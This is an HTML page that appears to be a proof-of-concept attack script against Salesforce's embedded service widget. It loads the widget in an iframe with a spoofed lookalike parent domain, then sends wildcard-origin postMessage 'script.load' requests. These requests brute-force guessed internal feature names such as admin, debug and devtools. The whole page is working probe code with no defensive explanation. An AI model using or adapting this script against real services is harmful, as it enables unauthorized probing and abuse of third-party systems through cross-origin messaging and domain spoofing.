<!DOCTYPE html>
<html>
<head>
  <title>Salesforce Script Load Test</title>
</head>
<body>
  <h2>Salesforce Internal Script Brute-Force</h2>
  <iframe id="eswFrame" src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz" style="width:100%; height:600px;"></iframe>

  <script>
    const iframe = document.getElementById("eswFrame");

    const internalFeatures = [
      "admin", "agent", "internal", "analytics", "debug",
      "monitoring", "logger", "network", "webhook", "devtools"
    ];

    let scriptLoadIndex = 0;
    let loaded = false;

    window.addEventListener("message", function (event) {
      if (typeof event.data === "object" && event.data.method) {
        console.log("ðŸ“© Message from iframe:", event.data);
        if (event.data.method === "session.onLoad") {
          console.log("[+] Iframe loaded (Salesforce 4.0)");
          // Start brute-forcing internal features
          loadNextFeature();
        }
      }
    });

    function loadNextFeature() {
      if (scriptLoadIndex >= internalFeatures.length) {
        console.log("âœ… All internal feature load attempts complete.");
        return;
      }

      const feature = internalFeatures[scriptLoadIndex];
      console.log(`[ðŸ“¤] Sending script.load for feature: '${feature}'`);
      iframe.contentWindow.postMessage({
        method: "script.load",
        domain: "reddit.com.wangdubruh.xyz",
        data: feature
      }, "*");

      scriptLoadIndex++;
      setTimeout(loadNextFeature, 1500); // Wait between loads
    }
  </script>
</body>
</html>
